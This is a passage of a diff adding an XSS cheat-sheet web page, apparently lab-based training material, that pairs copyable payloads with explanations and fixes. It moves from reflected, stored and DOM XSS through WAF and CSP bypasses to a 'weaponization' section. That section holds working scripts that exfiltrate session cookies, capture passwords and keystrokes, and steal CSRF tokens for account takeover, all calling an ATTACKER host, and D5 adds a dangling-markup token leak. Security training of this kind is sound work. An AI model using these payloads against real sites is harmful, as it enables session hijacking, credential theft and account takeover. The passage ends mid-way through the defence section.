+        <div><h4>Why it works</h4><p><code>"</code> closes <code>value</code>, a new <code>onmouseover</code> attribute is parsed, and hovering the input fires it. Encoded brackets are irrelevant — you never left the tag.</p></div>
+        <div><h4>Fix</h4><p>Attribute-encode <b>both</b> quote characters (<code>ENT_QUOTES</code>), or build attributes from an allowlist.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn t-stored" data-type="stored" data-title="stored xss into anchor href attribute with double quotes html encoded" id="b2">
+    <header><span class="sid">B2</span><span class="badge b-stored">Stored</span><span class="ctx">anchor href</span><span class="trig">🖱 click</span>
+      <h3>Stored XSS into anchor href attribute with double quotes HTML-encoded</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>The "website" field is stored into <code>&lt;a href="REFLECTED"&gt;</code>. Double quotes encoded → no attribute breakout. But nobody checks the URL <b>scheme</b>.</p></div>
+      <div class="codebox"><h4>Payload — website field</h4><button class="copy">copy</button>
+        <pre><code>javascript:alert(document.domain)</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p><code>href</code> accepts the <code>javascript:</code> pseudo-protocol; clicking the rendered link runs JS in the page's origin.</p></div>
+        <div><h4>Fix</h4><p>Allowlist schemes (http/https only); reject <code>javascript:</code>, <code>data:</code>, <code>vbscript:</code>; encode the attribute value.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn" data-type="reflected" data-title="reflected xss into a javascript string with angle brackets html encoded" id="b3">
+    <header><span class="sid">B3</span><span class="badge b-reflected">Reflected</span><span class="ctx">JS string</span><span class="trig">⚡ auto</span>
+      <h3>Reflected XSS into a JavaScript string with angle brackets HTML-encoded</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>Input reflects inside a script block: <code>var searchTerm = 'REFLECTED';</code>. Angle brackets are HTML-encoded — irrelevant: you're <b>already inside JavaScript</b>.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>'-alert(document.domain)-'</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p><code>'</code> closes the string, <code>-alert(…)</code> is a valid unary expression that invokes alert, and the trailing <code>'-</code> keeps the syntax legal.</p></div>
+        <div><h4>Fix</h4><p>JS-escape the value server-side (or <code>JSON.stringify</code> it); better: don't reflect into script blocks — use <code>data-*</code> attributes.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn" data-type="reflected" data-title="reflected xss into a javascript string with single quote and backslash escaped" id="b4">
+    <header><span class="sid">B4</span><span class="badge b-reflected">Reflected</span><span class="ctx">script block</span><span class="trig">⚡ auto</span>
+      <h3>Reflected XSS into a JavaScript string with single quote and backslash escaped</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>Same sink, but now <code>'</code> → <code>\'</code> and <code>\</code> → <code>\\</code>. The string is sealed — however, angle brackets are raw. Leave the <b>script block</b>, not the string.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>&lt;/script&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>The HTML parser ends the script element at <code>&lt;/script&gt;</code> regardless of JavaScript string state — the escaping was applied at the wrong layer.</p></div>
+        <div><h4>Fix</h4><p>HTML-encode <code>&lt;/</code> inside script content; ideally keep user data out of script blocks entirely.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn" data-type="reflected" data-title="reflected xss into a javascript string with angle brackets and double quotes html encoded and single quotes escaped" id="b5">
+    <header><span class="sid">B5</span><span class="badge b-reflected">Reflected</span><span class="ctx">JS string</span><span class="trig">⚡ auto</span>
+      <h3>Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p><code>&lt;&gt;</code> and <code>"</code> HTML-encoded, <code>'</code> backslash-escaped — but the <b>backslash itself isn't escaped</b>. Use your own backslash to consume theirs.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>\'-alert(document.domain)//</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>The escaper turns your input into <code>\\'</code> — a literal backslash, then a <b>real</b> closing quote. <code>-alert()</code> executes; <code>//</code> swallows the remainder.</p></div>
+        <div><h4>Fix</h4><p>Escape backslashes <b>before</b> quotes — or just <code>JSON.stringify</code> the value, which handles both.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn t-stored" data-type="stored" data-title="stored xss into onclick event with angle brackets and double quotes html encoded and single quotes and backslash escaped" id="b6">
+    <header><span class="sid">B6</span><span class="badge b-stored">Stored</span><span class="ctx">onclick attr</span><span class="trig">🖱 click</span>
+      <h3>Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>The website URL is stored into an event attribute: <code>onclick='…track('REFLECTED')…'</code>. <code>&lt;&gt;</code> and <code>"</code> HTML-encoded; <code>'</code> and <code>\</code> JS-escaped. Looks airtight — except <b>HTML decoding happens before JS parsing</b>.</p></div>
+      <div class="codebox"><h4>Payload — website field</h4><button class="copy">copy</button>
+        <pre><code>?&amp;apos;-alert(document.domain)-&amp;apos;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>The HTML parser decodes <code>&amp;apos;</code> → <code>'</code> while parsing the attribute — the JS escaper never saw a quote to escape. Double encoding lands where single decoding is applied.</p></div>
+        <div><h4>Fix</h4><p>Never compose JavaScript from user data inside event attributes; use <code>data-*</code> attributes + <code>addEventListener</code>.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn" data-type="reflected" data-title="reflected xss into a template literal with angle brackets single double quotes backslash and backticks unicode escaped" id="b7">
+    <header><span class="sid">B7</span><span class="badge b-reflected">Reflected</span><span class="ctx">template literal</span><span class="trig">⚡ auto</span>
+      <h3>Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>Input reflects inside a JS template literal; <code>&lt; &gt; ' " \ `</code> are all <code>\uXXXX</code>-escaped. But <code>$ { }</code> aren't — and inside a template literal, that's all you need.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>${alert(document.domain)}</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>Template interpolation executes arbitrary expressions <b>without</b> breaking out of the string — quote escaping is powerless against <code>${}</code>.</p></div>
+        <div><h4>Fix</h4><p>Never interpolate user input into template literals; if unavoidable, escape <code>${</code> as <code>\${</code>.</p></div>
+      </div>
+    </div>
+  </article>
+</section>
+
+<!-- ============ 03 DOM-BASED ============ -->
+<section id="dom">
+  <div class="sec-head rv"><span class="sec-num">03</span><h2>DOM-Based XSS — Client-Side Source to Sink</h2><span class="tag">C1 – C7</span></div>
+  <p class="note rv">The payload never needs to reach the server. Trace <b>sources</b> (<code>location</code>, <code>postMessage</code>, storage, fetched data) into <b>sinks</b> (<code>innerHTML</code>, <code>document.write</code>, <code>$()</code>, <code>eval</code>). The fragment (<code>#</code>) is your stealth channel — it never appears in server logs.</p>
+
+  <article class="scn t-dom" data-type="dom" data-title="dom xss in document.write sink using source location.search" id="c1">
+    <header><span class="sid">C1</span><span class="badge b-dom">DOM</span><span class="ctx">document.write</span><span class="trig">⚡ auto</span>
+      <h3>DOM XSS in document.write sink using source location.search</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p><code>document.write(…location.search…)</code> — the query string flows straight into an HTML-writing sink on page load.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>?search=&lt;img src=1 onerror=alert(document.domain)&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p><code>document.write</code> parses the string as HTML in body context. Note: <code>&lt;script&gt;</code> inserted this way won't execute — use an element with an event handler.</p></div>
+        <div><h4>Fix</h4><p>Retire <code>document.write</code>; use <code>textContent</code> for untrusted strings.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn t-dom" data-type="dom" data-title="dom xss in innerhtml sink using source location.search" id="c2">
+    <header><span class="sid">C2</span><span class="badge b-dom">DOM</span><span class="ctx">innerHTML</span><span class="trig">⚡ auto</span>
+      <h3>DOM XSS in innerHTML sink using source location.search</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p><code>el.innerHTML = new URLSearchParams(location.search).get('search')</code> — same source, different sink.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>?search=&lt;img src=1 onerror=alert(document.domain)&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p><code>innerHTML</code> parses the string as HTML; the image fails to load → <code>onerror</code> fires.</p></div>
+        <div><h4>Fix</h4><p><code>textContent</code> for text; DOMPurify if real HTML is required.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn t-dom" data-type="dom" data-title="dom xss in jquery selector sink using a hashchange event" id="c3">
+    <header><span class="sid">C3</span><span class="badge b-dom">DOM</span><span class="ctx">jQuery $()</span><span class="trig">⚡ auto</span>
+      <h3>DOM XSS in jQuery selector sink using a hashchange event</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>The page listens for <code>hashchange</code> and passes <code>location.hash</code> to jQuery's <code>$()</code>. jQuery treats a string starting with <code>&lt;</code> as <b>HTML to create</b>, not a selector.</p></div>
+      <div class="codebox"><h4>Payload — in the fragment</h4><button class="copy">copy</button>
+        <pre><code>#&lt;img src=1 onerror=alert(document.domain)&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p><code>$(location.hash)</code> creates the element; the fragment stays client-side, so server-side filters never see the payload.</p></div>
+        <div><h4>Fix</h4><p><code>document.getElementById(decodeURIComponent(hash.slice(1)))</code>; never pass raw input to <code>$()</code>.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn t-dom" data-type="dom" data-title="dom xss in document.write sink using source location.search inside a select element" id="c4">
+    <header><span class="sid">C4</span><span class="badge b-dom">DOM</span><span class="ctx">write → select</span><span class="trig">⚡ auto</span>
+      <h3>DOM XSS in document.write sink using source location.search inside a select element</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>The search term is written via <code>document.write</code> into an <code>&lt;option&gt;</code> inside a <code>&lt;select&gt;</code>. Looks contained — but the HTML parser disagrees.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>?search=&lt;img src=1 onerror=alert(document.domain)&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>The parser's <b>"in select" insertion mode</b> closes the select when it meets the <code>img</code> start tag and reprocesses it in normal mode — the img renders, <code>onerror</code> fires.</p></div>
+        <div><h4>Fix</h4><p>Build options with <code>createElement('option')</code> + <code>textContent</code>.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn t-dom" data-type="dom" data-title="dom xss in angularjs expression with angle brackets and double quotes html encoded" id="c5">
+    <header><span class="sid">C5</span><span class="badge b-dom">DOM</span><span class="ctx">AngularJS {{ }}</span><span class="trig">⚡ auto</span>
+      <h3>DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>AngularJS 1.x renders the page and your input reflects into the template. <code>&lt;&gt;</code> and <code>"</code> are encoded — but Angular expressions need neither.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>{{$on.constructor('alert(document.domain)')()}}
+
+&lt;!-- variant: {{constructor.constructor('alert(1)')()}} --&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>Angular evaluates <code>{{ }}</code> client-side; <code>$on.constructor</code> walks the prototype chain to <code>Function</code>, building and invoking arbitrary JS — no tags, no double quotes.</p></div>
+        <div><h4>Fix</h4><p>Upgrade Angular; enable a strict CSP; never reflect user input into template scope.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn t-dom" data-type="dom" data-title="reflected dom xss" id="c6">
+    <header><span class="sid">C6</span><span class="badge b-dom">DOM</span><span class="ctx">JSON → innerHTML</span><span class="trig">⚡ auto</span>
+      <h3>Reflected DOM XSS</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>The search term reflects into a <b>JSON response</b> — JSON-encoded, so it looks safe. But the client-side search handler takes the parsed value and writes it to <code>innerHTML</code>.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>?search=&lt;img src=1 onerror=alert(document.domain)&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>The vulnerability moved layers: safe at the server, fatal at the client sink. Always trace JSON values to their DOM sink.</p></div>
+        <div><h4>Fix</h4><p>Render results with <code>textContent</code>/<code>createElement</code>; treat all fetched data as untrusted.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn t-dom" data-type="dom" data-title="stored dom xss" id="c7">
+    <header><span class="sid">C7</span><span class="badge b-dom">DOM</span><span class="ctx">stored JSON → innerHTML</span><span class="trig">⚡ auto</span>
+      <h3>Stored DOM XSS</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>The comment is stored server-side, served as JSON, and rendered client-side via <code>innerHTML</code>. Neither endpoint alone looks vulnerable — the bug lives in the <b>pipeline</b>.</p></div>
+      <div class="codebox"><h4>Payload — comment field</h4><button class="copy">copy</button>
+        <pre><code>&lt;img src=1 onerror=alert(document.domain)&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>Storage and execution are decoupled; the client trusts "its own" data and hands it to a dangerous sink.</p></div>
+        <div><h4>Fix</h4><p>Sanitize at the render sink (DOMPurify); never assume stored = safe.</p></div>
+      </div>
+    </div>
+  </article>
+</section>
+
+<!-- ============ 04 EVASION ============ -->
+<section id="evasion">
+  <div class="sec-head rv"><span class="sec-num">04</span><h2>Filter &amp; CSP Evasion</h2><span class="tag">D1 – D6</span></div>
+
+  <article class="scn t-evasion" data-type="evasion" data-title="reflected xss with event handlers and href attributes blocked" id="d1">
+    <header><span class="sid">D1</span><span class="badge b-evasion">Evasion</span><span class="ctx">HTML body + WAF</span><span class="trig">🖱 click</span>
+      <h3>Reflected XSS with event handlers and href attributes blocked</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>The WAF blocks every <code>on*</code> event handler <b>and</b> the <code>href</code> attribute. You need JS execution with neither.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>&lt;form&gt;&lt;button formaction=javascript:alert(document.domain)&gt;Click me&lt;/button&gt;&lt;/form&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p><code>formaction</code> is a navigation attribute that is neither <code>href</code> nor an event handler — blocklists miss the whole family (<code>action</code>, <code>formaction</code>, <code>srcdoc</code>, <code>data</code>, <code>xlink:href</code>).</p></div>
+        <div><h4>Fix</h4><p>Block <code>javascript:</code> URLs in <b>any</b> navigation attribute; sanitize with an attribute-aware parser.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn t-evasion" data-type="evasion" data-title="reflected xss in a javascript url with some characters blocked" id="d2">
+    <header><span class="sid">D2</span><span class="badge b-evasion">Evasion</span><span class="ctx">javascript: URL</span><span class="trig">🖱 click</span>
+      <h3>Reflected XSS in a JavaScript URL with some characters blocked</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>Input reflects into a <code>javascript:</code> URL (e.g., a "Back to Blog" link built from the path). Some characters — often <code>(</code> <code>)</code> — are blocked.</p></div>
+      <div class="codebox"><h4>Payloads</h4><button class="copy">copy</button>
+        <pre><code>javascript:alert`1`
+
+javascript:alert&amp;lpar;1&amp;rpar;   &lt;!-- entities decode in attributes --&gt;
+javascript:%0dalert(1)          &lt;!-- CR breaks naive regex filters --&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>Tagged template literals call functions without parentheses; HTML entities are decoded in attribute context before the URL is parsed.</p></div>
+        <div><h4>Fix</h4><p>Never build <code>javascript:</code> URLs from user input; validate/allowlist paths.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn t-evasion" data-type="evasion" data-title="reflected xss with angularjs sandbox escape without strings" id="d3">
+    <header><span class="sid">D3</span><span class="badge b-evasion">Evasion</span><span class="ctx">AngularJS sandbox</span><span class="trig">⚡ auto</span>
+      <h3>Reflected XSS with AngularJS sandbox escape without strings</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>The AngularJS sandbox is active and <b>both quote characters are escaped</b> — you can't write string literals. So build one from char codes.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>{{toString().constructor.prototype.charAt=[].join;
+  $eval(toString().constructor.fromCharCode(97,108,101,114,116,40,49,41))}}
+
+&lt;!-- 97,108,101,114,116,40,49,41 = "alert(1)" --&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>Overwriting <code>charAt</code> blinds the sandbox's string detection; <code>fromCharCode</code> spells <code>alert(1)</code> without a single literal string.</p></div>
+        <div><h4>Fix</h4><p>Upgrade Angular (sandbox removed in 1.6 — its replacements are stronger); strict CSP; keep input out of templates.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn t-evasion" data-type="evasion" data-title="reflected xss with angularjs sandbox escape and csp" id="d4">
+    <header><span class="sid">D4</span><span class="badge b-evasion">Evasion</span><span class="ctx">AngularJS + CSP</span><span class="trig">⚡ auto</span>
+      <h3>Reflected XSS with AngularJS sandbox escape and CSP</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>The page enforces a CSP that kills inline <code>&lt;script&gt;</code> tags — but it also runs AngularJS, whose expression engine is itself an eval machine the policy tolerates.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>{{$eval.constructor('alert(document.domain)')()}}</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>The expression executes <b>inside Angular's own trusted script</b> — no new script element is ever created for the CSP to block. When the framework may eval, expression injection ≡ in-browser RCE.</p></div>
+        <div><h4>Fix</h4><p>Angular 2+ (no eval-based templates) plus a CSP without <code>unsafe-eval</code>.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn t-evasion" data-type="evasion" data-title="reflected xss protected by very strict csp with dangling markup attack" id="d5">
+    <header><span class="sid">D5</span><span class="badge b-evasion">Evasion</span><span class="ctx">strict CSP</span><span class="trig">⚡ auto</span>
+      <h3>Reflected XSS protected by very strict CSP, with dangling markup attack</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>Very strict CSP (<code>script-src 'self'</code>): no inline script, no eval, no <code>javascript:</code> URLs. But the injection sits inside an <b>attribute value</b> — and later in the HTML lives a secret (the CSRF token).</p></div>
+      <div class="codebox"><h4>Payload — no script executes</h4><button class="copy">copy</button>
+        <pre><code>"&gt;&lt;img src="https://ATTACKER/?
+
+&lt;!-- leave the quote dangling: everything after the injection,
+     token included, becomes part of the img URL and is
+     GET-ed to your server. Read it from the access log,
+     then POST the forged email change with the token. --&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>The browser percent-encodes the swallowed markup into the request URL — secrets exfiltrate as a plain GET, with zero script execution.</p></div>
+        <div><h4>Fix</h4><p>Attribute-encode <code>"</code> → <code>&amp;quot;</code>; restrict <code>img-src</code> to <code>'self'</code>; treat token leakage as first-class impact.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn t-evasion" data-type="evasion" data-title="reflected xss protected by csp with csp bypass" id="d6">
+    <header><span class="sid">D6</span><span class="badge b-evasion">Evasion</span><span class="ctx">CSP + JSONP</span><span class="trig">⚡ auto</span>
+      <h3>Reflected XSS protected by CSP, with CSP bypass</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>The CSP allows scripts from specific origins — and one of those origins hosts a <b>JSONP endpoint</b> that reflects the <code>callback</code> parameter raw into a JavaScript response.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>&lt;script src="https://ALLOWED-ORIGIN/data?callback=alert(document.domain)//"&gt;&lt;/script&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>The script's origin passes the CSP; the "callback" parameter lets you <b>write its contents</b>. A trusted CDN with a reflector = full CSP bypass.</p></div>
+        <div><h4>Fix</h4><p>Kill JSONP endpoints; pin exact script paths; prefer nonces over host allowlists; add SRI hashes.</p></div>
+      </div>
+    </div>
+  </article>
+</section>
+
+<!-- ============ 05 WEAPONIZATION ============ -->
+<section id="weaponize">
+  <div class="sec-head rv"><span class="sec-num">05</span><h2>Weaponization — From Alert to Account Takeover</h2><span class="tag">E1 – E3</span></div>
+  <p class="note rv">An alert box proves execution; it doesn't prove impact. These three chains convert any scenario above into reportable damage. <b>Order of preference:</b> cookies (E1) → if HttpOnly, credentials (E2) → if MFA/awareness, in-session forgery (E3).</p>
+
+  <article class="scn t-weapon" data-type="weapon" data-title="exploiting cross site scripting to steal cookies" id="e1">
+    <header><span class="sid">E1</span><span class="badge b-weapon">Weaponize</span><span class="ctx">session theft</span><span class="trig">⚡ auto</span>
+      <h3>Exploiting cross-site scripting to steal cookies</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>You have XSS — now convert it into session theft. Exfiltrate <code>document.cookie</code> to your server, then replay the session cookie from your proxy.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>&lt;script&gt;
+fetch('https://ATTACKER/log?c=' + encodeURIComponent(document.cookie))
+&lt;/script&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>Non-HttpOnly session cookies are readable from JS; one GET and the session is yours. If <code>HttpOnly</code> is set → pivot to E2 or E3.</p></div>
+        <div><h4>Fix</h4><p><code>HttpOnly; Secure; SameSite</code> on session cookies — limits impact, does not fix the XSS.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn t-weapon" data-type="weapon" data-title="exploiting cross site scripting to capture passwords" id="e2">
+    <header><span class="sid">E2</span><span class="badge b-weapon">Weaponize</span><span class="ctx">credential theft</span><span class="trig">⌨ victim login</span>
+      <h3>Exploiting cross-site scripting to capture passwords</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>Cookies are <code>HttpOnly</code> — so steal the credentials instead. Inject a grabber that rides the login form's submit event.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>&lt;script&gt;
+document.querySelector('form').addEventListener('submit', function (e) {
+  e.preventDefault();
+  var u = document.querySelector('#user').value;
+  var p = document.querySelector('#password').value;
+  fetch('https://ATTACKER/log?u=' + encodeURIComponent(u) +
+        '&amp;p=' + encodeURIComponent(p)).finally(function () { location.reload(); });
+});
+&lt;/script&gt;
+
+&lt;!-- keylogger variant: --&gt;
+&lt;script&gt;document.onkeypress = e =&gt; fetch('https://ATTACKER/log?k=' + e.key)&lt;/script&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>The handler runs inside the victim's page <b>before</b> the form leaves — plaintext credentials, straight to you.</p></div>
+        <div><h4>Fix</h4><p>HttpOnly won't help; only eliminating the XSS does. CSP report-only can surface unexpected external fetches.</p></div>
+      </div>
+    </div>
+  </article>
+
+  <article class="scn t-weapon" data-type="weapon" data-title="exploiting xss to bypass csrf defenses" id="e3">
+    <header><span class="sid">E3</span><span class="badge b-weapon">Weaponize</span><span class="ctx">CSRF chain → ATO</span><span class="trig">⚡ auto</span>
+      <h3>Exploiting XSS to bypass CSRF defenses</h3></header>
+    <div class="scn-grid">
+      <div><h4>Situation</h4><p>The app defends against CSRF with per-session tokens. But XSS runs <b>inside</b> the session — so read the token from a same-origin page and forge the request in one shot.</p></div>
+      <div class="codebox"><h4>Payload</h4><button class="copy">copy</button>
+        <pre><code>&lt;script&gt;
+fetch('/my-account').then(r =&gt; r.text()).then(html =&gt; {
+  var token = html.match(/name="csrf" value="([^"]+)"/)[1];
+  return fetch('/my-account/change-email', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: 'csrf=' + token + '&amp;email=attacker@evil.tld'
+  });
+}).then(() =&gt; location = '/my-account');
+&lt;/script&gt;</code></pre></div>
+      <div class="whyfix">
+        <div><h4>Why it works</h4><p>CSRF tokens stop cross-origin forgeries — they can't stop same-origin script execution. XSS + CSRF = account takeover.</p></div>
+        <div><h4>Fix</h4><p>Fix the XSS; require re-authentication for sensitive actions; <code>SameSite</code> cookies shrink the surface.</p></div>
+      </div>
+    </div>
+  </article>
+</section>
+
+<!-- ============ 06 SOURCES & SINKS ============ -->
+<section id="domref">
+  <div class="sec-head rv"><span class="sec-num">06</span><h2>DOM Source &amp; Sink Reference</h2><span class="tag">hunt pairs</span></div>
+  <div class="tblwrap rv"><table>
+    <tr><th>Sources (attacker-controlled input)</th><th>Notes</th></tr>
+    <tr><td><code>location.search</code> / <code>location.hash</code> / <code>location.href</code></td><td>query, fragment, full URL — fragment never reaches the server</td></tr>
+    <tr><td><code>document.URL</code> / <code>document.documentURI</code> / <code>document.baseURI</code></td><td>URL-derived, same class</td></tr>
+    <tr><td><code>document.referrer</code></td><td>attacker-controlled page can set it</td></tr>
+    <tr><td><code>window.name</code></td><td>persists across navigations — great stager</td></tr>
+    <tr><td><code>postMessage</code> data</td><td>dangerous without <code>origin</code> checks on the receiver</td></tr>
+    <tr><td><code>localStorage</code> / <code>sessionStorage</code> / <code>document.cookie</code></td><td>stored DOM XSS staging ground</td></tr>
+    <tr><td><code>XMLHttpRequest</code> / <code>fetch</code> responses</td><td>server data re-parsed client-side (C6, C7)</td></tr>
+  </table></div>
+  <div class="tblwrap rv"><table>
+    <tr><th>Sinks (where it becomes dangerous)</th><th>Class</th></tr>
+    <tr><td><code>document.write</code> / <code>writeln</code>, <code>innerHTML</code> / <code>outerHTML</code>, <code>insertAdjacentHTML</code>, <code>srcdoc</code></td><td>HTML injection</td></tr>
+    <tr><td><code>eval</code>, <code>new Function</code>, <code>setTimeout(string)</code>, <code>setInterval(string)</code></td><td>JS execution</td></tr>
+    <tr><td><code>location</code> / <code>assign</code> / <code>replace</code>, <code>href</code>/<code>src</code> setters, <code>setAttribute('on*'|'href')</code></td><td>navigation / attribute injection</td></tr>
+    <tr><td>jQuery: <code>$()</code>, <code>.html()</code>, <code>.append()</code>, <code>.wrap*</code>(), <code>.after()</code>/<code>.before()</code></td><td>HTML injection via library</td></tr>
+    <tr><td><code>Range.createContextualFragment</code>, <code>DOMParser</code> (then adopted into DOM)</td><td>HTML parsing</td></tr>
+  </table></div>
+  <p class="note rv"><b>Hunting rules:</b> ① test fragments with <code>#payload</code> — invisible to server logs; ② audit every <code>postMessage</code> listener for missing origin validation; ③ for each source, grep the bundle for every sink and trace the data path; ④ JSON at the server ≠ safe at the sink.</p>
+</section>
+
+<!-- ============ 07 DEFENSE ============ -->
+<section id="defense">
+  <div class="sec-head rv"><span class="sec-num">07</span><h2>Defense — Killing the Bug Class</h2><span class="tag">remediation</span></div>
+  <div class="defgrid">
+    <div class="defcard rv"><h4><span>D1</span>Context-aware output encoding</h4>
+      <p>Encode for the context the value lands in — body, attribute, JS, or URL. One encoder does not cover all four.</p>
+      <pre><code>// PHP — attribute/body
+htmlspecialchars($v, ENT_QUOTES, 'UTF-8');
+// Jinja2 — autoescape ON, never |safe on user data
+// JS strings — JSON.stringify(value)</code></pre></div>
+    <div class="defcard rv"><h4><span>D2</span>Safe DOM APIs</h4>
+      <p>Ban dangerous sinks in code review; reach for text-only APIs. When HTML is genuinely required, sanitize.</p>
+      <pre><code>// ✗ el.innerHTML = userInput
+// ✓ el.textContent = userInput
+// ✓ el.innerHTML = DOMPurify.sanitize(userHtml)</code></pre></div>
+    <div class="defcard rv"><h4><span>D3</span>Trusted Types</h4>
+      <p>Forces every assignment to a dangerous sink through an approved policy — DOM XSS becomes structurally hard.</p>
+      <pre><code>Content-Security-Policy:
+  require-trusted-types-for 'script'</code></pre></div>
+    <div class="defcard rv"><h4><span>D4</span>Strong CSP</h4>
+      <p>Nonce-based script loading; no <code>unsafe-inline</code>/<code>unsafe-eval</code>; lock down object and base. Kills inline injection, JSONP gadgets, and dangling exfil channels.</p>
+      <pre><code>Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-{random}';
+  object-src 'none'; base-uri 'none';
+  img-src 'self'; frame-ancestors 'self'</code></pre></div>
+    <div class="defcard rv"><h4><span>D5</span>Cookie hardening</h4>
+      <p>Doesn't prevent XSS, but severs the E1 cookie-theft chain and raises the cost of every escalation.</p>
+      <pre><code>Set-Cookie: session=…; HttpOnly; Secure;
+            SameSite=Strict; Path=/</code></pre></div>
+    <div class="defcard rv"><h4><span>D6</span>URL scheme allowlist</h4>
+      <p>For every user-influenced <code>href</code>/<code>src</code>/<code>action</code>: parse with the URL API, accept only http/https.</p>
+      <pre><code>const u = new URL(input, base);
+if (!['http:', 'https:'].includes(u.protocol)) reject();</code></pre></div>
+    <div class="defcard rv"><h4><span>D7</span>Framework defaults</h4>
+      <p>React escapes by default; keep it that way. Audit every escape hatch: <code>dangerouslySetInnerHTML</code>, <code>v-html</code>, <code>ng-bind-html</code>, <code>|safe</code>. Prefer Angular 2+ over 1.x.</p></div>
+    <div class="defcard rv"><h4><span>D8</span>Validation is a layer, not a fix</h4>
